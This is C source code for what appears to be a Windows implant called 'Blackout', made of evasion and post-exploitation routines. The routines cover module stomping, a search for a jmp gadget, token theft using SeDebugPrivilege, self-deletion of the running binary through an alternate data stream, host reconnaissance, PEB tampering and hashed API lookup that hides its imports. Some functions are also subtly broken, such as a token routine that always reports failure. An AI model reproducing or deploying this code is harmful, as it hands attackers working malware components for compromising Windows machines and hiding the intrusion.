#include <common.h>
#include <constexpr.h>

typedef HMODULE (*fnLoadLibraryA)( LPCSTR );

FUNC BOOL CreateImplantBackup(
    VOID
) {
    BLACKOUT_INSTANCE

    LARGE_INTEGER MaximumSize = { 0 };
    MaximumSize.HighPart = 0;
    MaximumSize.LowPart  = Instance()->Blackout.Region.Length;
    HANDLE        hSection    = NULL;
    ULONG         Status      = STATUS_SUCCESS;

    Status = Instance()->Win32.NtCreateSection( 
        &hSection, SECTION_ALL_ACCESS, NULL, 
        &MaximumSize, PAGE_READWRITE, SEC_COMMIT, NULL 
    ); 
    if ( Status != 0 ) return FALSE;

    Status = Instance()->Win32.NtMapViewOfSection( 
        hSection, NtCurrentProcess(), &Instance()->Blackout.Stomp.Backup, 
        0, 0, 0, &Instance()->Blackout.Region.Length, ViewShare, 0, PAGE_READWRITE 
    );
    if ( Status != 0 ) return FALSE;

    return TRUE;
}

FUNC VOID GetStompedModule(
    VOID
) {
    BLACKOUT_INSTANCE

    PLDR_DATA_TABLE_ENTRY Data    = { 0 };
    PLIST_ENTRY           Head    = { 0 };
    PLIST_ENTRY           Entry   = { 0 };
    
    PVOID          CurAddr           = NULL;
    PVOID          ClosestModuleBase = NULL;
    ULONG_PTR      MinDistance       = (ULONG_PTR)-1; 

    CurAddr = Instance()->Blackout.Region.Base;
    Head    = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList; 

    for ( Entry = Head->Flink; Entry != Head; Entry = Entry->Flink ) {
        Data = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );
        
        PVOID ModuleBase = Data->DllBase;

        ULONG_PTR Distance = (ULONG_PTR)ModuleBase > (ULONG_PTR)CurAddr
                                 ? (ULONG_PTR)ModuleBase - (ULONG_PTR)CurAddr
                                 : (ULONG_PTR)CurAddr    - (ULONG_PTR)ModuleBase;

        if ( Distance < MinDistance ) {
            MinDistance       = Distance; 
            ClosestModuleBase = ModuleBase;  
            Blackout().Stomp.UsMod   = Data->BaseDllName;
            Blackout().Stomp.ModBase = Data->DllBase;
        }
    }

    return;
}

FUNC PVOID FindJmpGadget( 
    PVOID ModuleBase,
    BYTE  Register
) {
    UINT64 Gadget      = 0;
    PBYTE  SearchBase  = NULL;
    UINT64 SearchSize  = 0;

    SearchBase = ModuleBase + 0x1000;
    SearchSize = 0x1000 * 0x1000;    

    for ( INT i = 0; i < SearchSize - 1; i++ ) {
        if ( SearchBase[i] == 0xff && SearchBase[i+1] == 0x23 ) {
            Gadget = SearchBase + i;
            break;
        }
    }

    return Gadget;
}

FUNC VOID GetTokenUserA( 
    _In_  HANDLE  TokenHandle,
    _Out_ PSTR   *UserName,
    _Out_ DWORD  *UserNameBuffLen
) {
    BLACKOUT_INSTANCE

    PTOKEN_USER  pTokenUser = { 0 };
    SID_NAME_USE SidName    = { 0 };
    DWORD        Err        = 0;
    DWORD        RetLen     = 0;
    DWORD        UserLen    = 0;
    DWORD        DomainLen  = 0;
    DWORD        TotalLen   = 0;
    PVOID        UserStr    = NULL;
    PVOID        DomainStr  = NULL;

    Instance()->Win32.NtQueryInformationToken( TokenHandle, TokenUser, NULL, NULL, &RetLen );

    pTokenUser = bkHeapAlloc( RetLen );

    Err = Instance()->Win32.NtQueryInformationToken( TokenHandle, TokenUser, pTokenUser, RetLen, &RetLen );

   if ( !Instance()->Win32.LookupAccountSidA( NULL, pTokenUser->User.Sid, NULL, &UserLen, NULL, &DomainLen, &SidName ) ) {
        TotalLen = ( UserLen * sizeof( CHAR ) ) + ( DomainLen * sizeof( CHAR ) ) + sizeof( CHAR );

        *UserName = bkHeapAlloc( TotalLen );
        *UserNameBuffLen = TotalLen;

        DomainStr = *UserName;
        UserStr   = (*UserName) + DomainLen;

        SidName = 0;

        if ( !Instance()->Win32.LookupAccountSidA( NULL, pTokenUser->User.Sid, UserStr, &UserLen, DomainStr, &DomainLen, &SidName ) ) {
            Err = NtLastError();
            goto _Leave;
        }

    (*UserName)[DomainLen] = '\\';

   }

_Leave:
    if ( pTokenUser )
        bkHeapFree( pTokenUser, RetLen );
    if ( Err != STATUS_SUCCESS )
        PackageTransmitError( Err );

    return;
}

BOOL TokenSteal(
    _In_ DWORD   ProcessId,
    _In_ HANDLE *TokenHandle
) {
    HANDLE ProcessHandle = NULL;
    BOOL   bCheck        = FALSE;
    DWORD  Err           = 0;

    if ( *TokenHandle = NtCurrentProcessToken() ) {

        SetPrivilege( *TokenHandle, "SeDebugPrivilege" );
        
        bkHandleClose( TokenHandle );
        TokenHandle = NULL;
    } 

    Err = bkProcessOpen( PROCESS_QUERY_INFORMATION, TRUE, ProcessId, &ProcessHandle );
    if ( Err != 0 )
        return FALSE;

    Err = bkTokenOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle, 0x01 );
    if ( Err != 0 )
        return FALSE;

_Leave:
    if ( ProcessHandle )
        bkHandleClose( ProcessHandle );

    return bCheck;
}

BOOL SetPrivilege(
    _In_ HANDLE hToken,
    _In_ LPCSTR PrivilegeName
) {
    BLACKOUT_INSTANCE

    TOKEN_PRIVILEGES TokenPrivs = { 0x00 };
    LUID			 Luid       = { 0x00 };
    BOOL             bCheck     = FALSE;

    bCheck = Instance()->Win32.LookupPrivilegeValueA( NULL, PrivilegeName, &Luid );
    if ( !bCheck ) return FALSE;
    
    TokenPrivs.PrivilegeCount           = 0x01;	// Adjusting one privilege (one element of the 'Privileges' structure array)
    TokenPrivs.Privileges[0].Luid       = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bCheck = Instance()->Win32.AdjustTokenPrivileges(
        hToken, FALSE, &TokenPrivs, 
        sizeof( TOKEN_PRIVILEGES ), NULL, NULL
    );
    if ( !bCheck ) return FALSE;
    

    if ( NtLastError() == ERROR_NOT_ALL_ASSIGNED )
        return FALSE;
    
    return bCheck;
}

FUNC BOOL SelfDeletion(
    void
) {
    BLACKOUT_INSTANCE

    FILE_DISPOSITION_INFORMATION Delete = { 0 };  
    PFILE_RENAME_INFORMATION     Rename = { 0 };

    BOOL   bCheck    = FALSE;
    HANDLE hFile     = NULL;
    PCWSTR NewStream = L":BKSTREAM";
    UINT64 StreamLen = StringLengthW( NewStream ) * sizeof( WCHAR );
    UINT64 RenameLen = sizeof( FILE_RENAME_INFORMATION ) + StreamLen;

    Rename = bkHeapAlloc( RenameLen );

    MmZero( &Delete, sizeof( FILE_DISPOSITION_INFORMATION ) );

    Delete.DeleteFileA = TRUE;

    Rename->FileNameLength = StreamLen;
    MmCopy( Rename->FileName, NewStream, StreamLen );

    hFile = Instance()->Win32.CreateFileW( 
        Instance()->Session.ProcessFullPath, 
        DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, 
        OPEN_EXISTING, NULL, NULL
    );
    if ( hFile == INVALID_HANDLE_VALUE ) return FALSE;

    bCheck = Instance()->Win32.SetFileInformationByHandle( 
        hFile, FileRenameInfo, Rename, RenameLen 
    );
    if ( !bCheck ) return;

    bkHandleClose( hFile );

    hFile = Instance()->Win32.CreateFileW( 
        Instance()->Session.ProcessFullPath, 
        DELETE | SYNCHRONIZE, FILE_SHARE_READ, 
        NULL, OPEN_EXISTING, NULL, NULL 
    );
    if ( hFile == INVALID_HANDLE_VALUE ) return FALSE;

    bCheck = Instance()->Win32.SetFileInformationByHandle( 
        hFile, FileDispositionInfo, &Delete, sizeof( Delete ) 
    );
    if ( !bCheck ) return FALSE;

    bkHandleClose( hFile );

    bkHeapFree( Rename, RenameLen );
}

FUNC PWSTR GetEnvVar( 
    _In_ PWSTR EnvVar 
) {
    BLACKOUT_INSTANCE

    PWSTR EnvTmp = Instance()->Teb->ProcessEnvironmentBlock->ProcessParameters->Environment;

    while ( 1 ) {
		int j = StringLengthW( EnvTmp );

		if ( !j ) {
			EnvTmp = NULL;
			break;
		}

		if (*(ULONG_PTR*)EnvTmp == *(ULONG_PTR*)EnvVar)
			break;
            
		EnvTmp = EnvTmp + ( j * sizeof(WCHAR) ) + sizeof(WCHAR);
	}

	if ( EnvTmp ) {
		int j = StringLengthW( EnvTmp ) * sizeof(WCHAR);
		
		for (int i = 0; i <= j; i++) {
			if ( (WCHAR)EnvTmp[i] == (WCHAR)L'=' )
				return (PWSTR)&EnvTmp[i + sizeof(WCHAR)];
		}
	}
	
	return NULL;
}

FUNC VOID GetComputerInfo(
    _Out_ WORD  *ProcessArch,
    _Out_ DWORD *ProcessType,
    _Out_ DWORD *ProductType, 
    _Out_ PSTR  *IpAddress
) {
    BLACKOUT_INSTANCE

    DWORD ReturnProductTp = 0;
    DWORD UserTmpLen = MAX_PATH;
    DWORD CompTmpLen = 0;
    DWORD DomainLen  = 0;
    DWORD NetBiosLen = 0;
    DWORD Length     = 0;
    BOOL  bCheck     = 0;

    SYSTEM_INFO SysInf = { 0 };

    Instance()->Win32.GetNativeSystemInfo( &SysInf );

    bCheck = Instance()->Win32.GetProductInfo( 
        Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion, 
        Instance()->Teb->ProcessEnvironmentBlock->OSMinorVersion, 
        Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMajorVersion,
        Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMinorVersion, &ReturnProductTp 
    );

    if( !bCheck )
        PackageTransmitError( NtLastError() );

    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &CompTmpLen ) ) {
        Instance()->System.ComputerName = bkHeapAlloc( CompTmpLen );
        Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, Instance()->System.ComputerName, &CompTmpLen );
    }

    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &DomainLen ) ) {
        Instance()->System.DomainName = bkHeapAlloc( DomainLen );
        Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, Instance()->System.DomainName, &DomainLen );
    }

    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &NetBiosLen ) ) {
        Instance()->System.NetBios = bkHeapAlloc( NetBiosLen );
        Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, Instance()->System.NetBios, &NetBiosLen );
    }

    ULONG AdapterInfoSize = 0;
    PIP_ADAPTER_INFO Adapters = NULL;

    if ( Instance()->Win32.GetAdaptersInfo( NULL, &AdapterInfoSize ) == ERROR_BUFFER_OVERFLOW ) {
        Adapters = bkHeapAlloc( AdapterInfoSize );
        if (Adapters) {
            Instance()->Win32.GetAdaptersInfo( Adapters, &AdapterInfoSize );
        }
    }

    Instance()->System.UserName = bkHeapAlloc( UserTmpLen );
    Instance()->Win32.GetUserNameA( Instance()->System.UserName, &UserTmpLen );
    
    *ProcessArch  = SysInf.wProcessorArchitecture;
    *ProcessType  = SysInf.dwProcessorType;
    *ProductType  = ReturnProductTp;
    *IpAddress    = (Adapters && Adapters->IpAddressList.IpAddress.String[0]) ? Adapters->IpAddressList.IpAddress.String : NULL;

LeaveFunc:
    if ( Adapters ) 
        bkHeapFree( Adapters, Length );

    return;
}

FUNC VOID GetProcessInfo(
	_Out_     PWSTR *FullPath,
	_Out_     PWSTR *BaseName,
	_Out_     PWSTR *CmdLine
) {
	BLACKOUT_INSTANCE

	PPEB                  Peb   = { 0 };
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

	Peb   = NtCurrentTeb()->ProcessEnvironmentBlock;
    Head  = &Peb->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

	Data = C_PTR( Entry );

	*FullPath = Data->FullDllName.Buffer;
	*BaseName = Data->BaseDllName.Buffer;
	*CmdLine  = Peb->ProcessParameters->CommandLine.Buffer;

    PROCESS_EXTENDED_BASIC_INFORMATION Ebi = { 0 };

    MmZero( &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ) );

    Instance()->Win32.NtQueryInformationProcess( NtCurrentProcess(), ProcessBasicInformation, &Ebi, sizeof( Ebi ), NULL );
    Instance()->Session.Protected    = Ebi.IsProtectedProcess;
    Instance()->Session.ParentProcId = HandleToULong( Ebi.BasicInfo.InheritedFromUniqueProcessId );

	return;    
}

FUNC BOOL KillProcess(
	_In_ DWORD ProcessId
) {
	BLACKOUT_INSTANCE

	HANDLE hProcess = NULL; 
	BOOL   bSuccess = FALSE;
    DWORD  Err      = 0;

	Err = bkProcessOpen( PROCESS_TERMINATE, FALSE, ProcessId, &hProcess );
	
	if ( !hProcess )
		return FALSE;

	bSuccess = bkProcessTerminate( hProcess, 0x01 );

	bkHandleClose( hProcess );
	
	return bSuccess;
}

FUNC BOOL FixPeb(
    PCWSTR ModuleName
) {
    BLACKOUT_INSTANCE

    PLDR_DATA_TABLE_ENTRY Data   = { 0 };
    PLIST_ENTRY           Head   = &Instance()->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY           Entry  = Head->Flink;
    PIMAGE_NT_HEADERS     NtHdrs = { 0 };
    UINT64                Ep     = 0;
    PVOID                 Module = NULL;

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        if ( StringCompareW( Data->BaseDllName.Buffer, ModuleName ) == 0 ) {
            Module = Data->DllBase;
            break;
        }
     }

    NtHdrs = (PIMAGE_NT_HEADERS)( (PBYTE)( Module ) + ( (PIMAGE_DOS_HEADER)( Module ) )->e_lfanew );
    Ep     = Module + NtHdrs->OptionalHeader.AddressOfEntryPoint;
    
    Data->EntryPoint = Ep;
    Data->Flags      = 0x8a2cc;
    Data->ImageDll   = 1;
    Data->LoadNotificationsSent = 1;
    Data->ProcessStaticImport   = 0;
    return TRUE;
}

FUNC PVOID LdrModuleAddr(
    _In_ ULONG Hash
) {
	BLACKOUT_INSTANCE

    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    CHAR cDllName[256] = { 0 };

    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    if ( !Hash ) {
        Data = C_PTR( Entry );
        return Data->DllBase;
    }

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        toUpperCaseChar( cDllName );
        WCharStringToCharString( cDllName, Data->BaseDllName.Buffer, Data->BaseDllName.MaximumLength );

        if ( HashString( cDllName, 0 ) == Hash ) {
            return Data->DllBase;
        }
    }    

    return NULL;
}

FUNC PVOID LdrFuncAddr( 
    _In_ PVOID BaseModule, 
    _In_ ULONG FuncName 
) {
    PIMAGE_NT_HEADERS       pImgNt         = { 0 };
    PIMAGE_EXPORT_DIRECTORY pImgExportDir  = { 0 };
    DWORD                   ExpDirSz       = 0x00;
    PDWORD                  AddrOfFuncs    = NULL;
    PDWORD                  AddrOfNames    = NULL;
    PWORD                   AddrOfOrdinals = NULL;
    PVOID                   FuncAddr       = NULL;

    pImgNt          = C_PTR( BaseModule + ((PIMAGE_DOS_HEADER)BaseModule)->e_lfanew );
    pImgExportDir   = C_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
    ExpDirSz        = U_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size );

    AddrOfNames     = C_PTR( BaseModule + pImgExportDir->AddressOfNames );
    AddrOfFuncs     = C_PTR( BaseModule + pImgExportDir->AddressOfFunctions );
    AddrOfOrdinals  = C_PTR( BaseModule + pImgExportDir->AddressOfNameOrdinals );

    for ( int i = 0 ; i < pImgExportDir->NumberOfNames ; i++ ) {
        PCHAR pFuncName         = (PCHAR)( BaseModule + AddrOfNames[i] );
        PVOID pFunctionAddress  = C_PTR( BaseModule + AddrOfFuncs[AddrOfOrdinals[i]] );

        if ( HashString( pFuncName, 0 ) == FuncName ) {
            if (( U_PTR( pFunctionAddress ) >= U_PTR( pImgExportDir ) ) &&
                ( U_PTR( pFunctionAddress )  < U_PTR( pImgExportDir ) + ExpDirSz )) {

                CHAR  ForwarderName[MAX_PATH] = { 0 };
                DWORD dwOffset                = 0x00;
                PCHAR FuncMod                 = NULL;
                PCHAR nwFuncName              = NULL;

                MmCopy( ForwarderName, pFunctionAddress, StringLengthA( (PCHAR)pFunctionAddress ) );

                for ( int j = 0 ; j < StringLengthA( (PCHAR)ForwarderName ) ; j++ ) {
                    if (((PCHAR)ForwarderName)[j] == '.') {
                        dwOffset         = j;
                        ForwarderName[j] = '\0';
                        break;
                    }
                }

                FuncMod    = ForwarderName;
                nwFuncName = ForwarderName + dwOffset + 1;

                fnLoadLibraryA pLoadLibraryA = LdrFuncAddr(LdrModuleAddr(H_MODULE_KERNEL32), HASH_STR( "LoadLibraryA" ) );

                HMODULE hForwardedModule = pLoadLibraryA(FuncMod);
                if ( hForwardedModule ) {
                    if ( nwFuncName[0] == '#' ) {
                        int ordinal = (INT)( nwFuncName + 1 );
                        return (PVOID)LdrFuncAddr( hForwardedModule, HASH_STR( (LPCSTR)ordinal ) );
                    } else {
                        return (PVOID)LdrFuncAddr( hForwardedModule, HASH_STR( nwFuncName ) );
                    }
                }
                return NULL;
            }

            return C_PTR( pFunctionAddress );
        }
    }

    return NULL;
}

FUNC PVOID LdrLoadLib( 
    PWSTR Module
) {
    BLACKOUT_INSTANCE

    UNICODE_STRING uStrMod = { 0 };
    PVOID          hModule = NULL;
    ULONG          Status  = 0;

    InitUnicodeString( &uStrMod, Module );

    Status = Instance()->Win32.LdrLoadDll( NULL, 0, &uStrMod, &hModule );
    if ( Status != 0 ) return NULL;

    return hModule;
}